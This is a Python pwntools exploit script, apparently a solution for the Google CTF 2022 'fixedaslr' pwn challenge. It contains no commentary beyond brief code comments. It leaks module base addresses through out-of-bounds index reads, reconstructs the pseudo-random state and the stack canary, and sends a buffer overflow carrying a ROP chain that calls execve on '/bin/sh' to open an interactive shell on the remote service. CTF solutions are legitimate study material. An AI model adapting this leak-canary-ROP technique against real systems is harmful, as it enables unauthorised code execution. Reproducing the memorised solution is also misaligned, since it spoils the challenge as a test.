from pwn import *
import sys
import binascii

# main.o
# syscalls.o
# guard.o
# basic.o
# game.o
# res.o
# debug.o

if sys.argv[1] == "r":
    p = remote("fixedaslr.2022.ctfcompetition.com", 1337)
else:
    # p = process("./loader")
    # gdb.attach(p, """
    #         
    #         """)
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug("./loader", """
            continue
            """, aslr=True)

def c(idx):
    p.sendlineafter(b'our choice?\n', b'3')
    p.sendlineafter(b'ce\'s score do you want to see (0-9)?\n', str(idx).encode('utf-8'))
    p.recvuntil(b'his place you need to beat this score: ')
    return int(p.recvline())

def extract_bit(num, idx):
    return int((num>>idx) & 1)

def solve():
    # leak base address
    game = c(2305843009213692929) - 0x1111
    guard = c(2305843009213692935) - 0x1000
    main = c(512) - 0x2060
    tmp1 = main + 0x2000
    tmp2 = game + 8
    space = (tmp2 - tmp1 + 2**64) // 8
    basic = c(space) - 0x119c
    tmp2 = game + 0x2000
    space = (tmp2 - tmp1 + 2**64) // 8
    res = c(space) - 0x1000
    tmp2 = guard + 8
    space = (tmp2 - tmp1 + 2**64) // 8
    syscalls = c(space) - 0x1064

    main >>= 28
    syscalls >>= 28
    guard >>= 28
    basic >>= 28
    game >>= 28
    res >>= 28

    print('main: '+hex(main))
    print('syscalls: '+hex(syscalls))
    print('guard: '+hex(guard))
    print('basic: '+hex(basic))
    print('game: '+hex(game))
    print('res: '+hex(res))

    # craft rand_state
    rand_state = res + (game<<12) + (basic<<24) + (guard<<36) + (syscalls<<48) + (main<<60)

    success("rand_state: %s"%hex(rand_state))

    # restore last 2 bytes of canary
    # byte 1 
    first_2_byte_main = main >> 4
    first_byte_res = res >> 8
    
    last_byte_canary = 0x0
    bit1_last_byte_canary = (extract_bit(first_byte_res, 0) ^ extract_bit(first_2_byte_main, 6) ^ extract_bit(first_2_byte_main, 5) ^ extract_bit(first_2_byte_main, 3) ^ 1) & 1
    last_byte_canary += bit1_last_byte_canary

    first_2_byte_main >>= 1
    first_2_byte_main += (bit1_last_byte_canary << 7) & 0xff
    bit2_last_byte_canary = (extract_bit(first_byte_res, 1) ^ extract_bit(first_2_byte_main, 6) ^ extract_bit(first_2_byte_main, 5) ^ extract_bit(first_2_byte_main, 3) ^ 1) & 1
    last_byte_canary += bit2_last_byte_canary << 1

    first_2_byte_main >>= 1
    first_2_byte_main += (bit2_last_byte_canary << 7) & 0xff
    bit3_last_byte_canary = (extract_bit(first_byte_res, 2) ^ extract_bit(first_2_byte_main, 6) ^ extract_bit(first_2_byte_main, 5) ^ extract_bit(first_2_byte_main, 3) ^ 1) & 1
    last_byte_canary += bit3_last_byte_canary << 2

    first_2_byte_main >>= 1
    first_2_byte_main += (bit3_last_byte_canary << 7) & 0xff
    bit4_last_byte_canary = (extract_bit(first_byte_res, 3) ^ extract_bit(first_2_byte_main, 6) ^ extract_bit(first_2_byte_main, 5) ^ extract_bit(first_2_byte_main, 3) ^ 1) & 1
    last_byte_canary += bit4_last_byte_canary << 3

    # byte 2
    second_last_byte_canary = 0x0 
    first_2_byte = (main>>8) + (last_byte_canary<<4)
    last_byte_game = (game) & 0xf

    bit1_second_last_byte_canary =  (extract_bit(last_byte_game, 0) ^ extract_bit(first_2_byte, 6) ^ extract_bit(first_2_byte, 5) ^ extract_bit(first_2_byte, 3) ^ 1) & 1
    second_last_byte_canary += bit1_second_last_byte_canary 

    first_2_byte >>= 1
    first_2_byte += (bit1_second_last_byte_canary << 7) & 0xff
    bit2_second_last_byte_canary = (extract_bit(last_byte_game, 1) ^ extract_bit(first_2_byte, 6) ^ extract_bit(first_2_byte, 5) ^ extract_bit(first_2_byte, 3) ^ 1) & 1
    second_last_byte_canary += bit2_second_last_byte_canary << 1

    first_2_byte >>= 1
    first_2_byte += (bit2_second_last_byte_canary << 7) & 0xff
    bit3_second_last_byte_canary = (extract_bit(last_byte_game, 2) ^ extract_bit(first_2_byte, 6) ^ extract_bit(first_2_byte, 5) ^ extract_bit(first_2_byte, 3) ^ 1) & 1
    second_last_byte_canary += bit3_second_last_byte_canary << 2

    first_2_byte >>= 1
    first_2_byte += (bit3_second_last_byte_canary << 7) & 0xff
    bit4_second_last_byte_canary = (extract_bit(last_byte_game, 3) ^ extract_bit(first_2_byte, 6) ^ extract_bit(first_2_byte, 5) ^ extract_bit(first_2_byte, 3) ^ 1) & 1
    second_last_byte_canary += bit4_second_last_byte_canary << 3

    last_2_byte_canary = last_byte_canary + (second_last_byte_canary << 4)
    success("last 2 bytes canary: %s" % hex(last_2_byte_canary))

    # restore canary
    canary = last_2_byte_canary + ((game >> 4) << 8) + (basic << 16) + (guard << 28) + (syscalls << 40) + (main << 52)
    # binary_list = binascii.unhexlify(canary)
    list_bin = [int(i) for i in list(bin(canary)[2:])]

    for i in range(len(list_bin) - 9, -1, -1):
        tmp = list_bin[i] ^ list_bin[i+2] ^ list_bin[i+3] ^ list_bin[i+5] ^ 1
        list_bin[i] = tmp

    canary = int("".join(str(i) for i in list_bin), 2)
    
    print("canary: " + hex(canary))

    # restore debug base addr
    debug_bin = [0] * 12
    rand_state_debug = res + (game<<12) + (basic<<24) + (guard<<36) + (syscalls<<48) + ((main & 0xf) << 60)
    print("rand_state_debug: " + hex(rand_state_debug))
    list_rand_state_debug = [int(i) for i in list(bin(rand_state_debug)[2:])]

    for i in range(12):
        debug_bin[i] = list_rand_state_debug[i] ^ list_rand_state_debug[i+2] ^ list_rand_state_debug[i+3] ^ list_rand_state_debug[i+5] ^ 1

    debug = int("".join(str(i) for i in debug_bin), 2)
   
    syscall_base = syscalls << 28
    debug_base = (debug << 28) + 0x1000
    main_base = main << 28
    pop_rdi = 0x1
    pop_rsi = 0x4
    pop_rdx = 0x10
    pop_rax = 7
    rop = ""
    rop += p64(debug_base + 1)
    rop += p64(main_base + 0x2000 + 0x60 + (12+0x18)*0x8)
    rop += p64(debug_base + 4)
    rop += p64(0)
    rop += p64(debug_base + pop_rdx)
    rop += p64(0)
    rop += p64(debug_base + pop_rax)
    rop += p64(0x3b)
    rop += p64(syscall_base + 0x1000 + 0xa)

    payload = "/bin/sh\x00" + "A"*0x20 + p64(canary) + p64(0) + rop

    p.sendlineafter("choice?\n", str(1))
    for i in range(11):
        p.recvuntil("is ")
        lhs = int(p.recv(1))
        p.recv(3)
        rhs = int(p.recv(1))
        p.sendlineafter("?\n", str(lhs+rhs))

    p.sendlineafter("?\n", str(0))
    p.sendlineafter(")?\n", str(1000))
    p.sendlineafter("name:\n", payload)
    p.interactive()


if __name__ == "__main__":
    solve()
